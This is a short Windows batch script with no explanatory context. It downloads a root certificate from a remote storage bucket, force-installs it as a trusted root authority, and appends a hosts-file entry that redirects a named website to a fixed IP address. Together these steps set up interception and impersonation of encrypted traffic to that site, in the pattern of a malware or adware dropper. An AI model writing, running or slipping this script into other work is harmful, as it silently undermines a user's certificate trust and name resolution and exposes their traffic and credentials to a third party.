@echo off
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://on9i1rseh.bkt.clouddn.com/rootCA.pem', '%~dp0rootCA.pem')"
certutil -addstore -f -enterprise -user root "%~dp0rootCA.pem"
echo 45.79.77.119 www.image-feedback.com >> %windir%\System32\drivers\etc\hosts
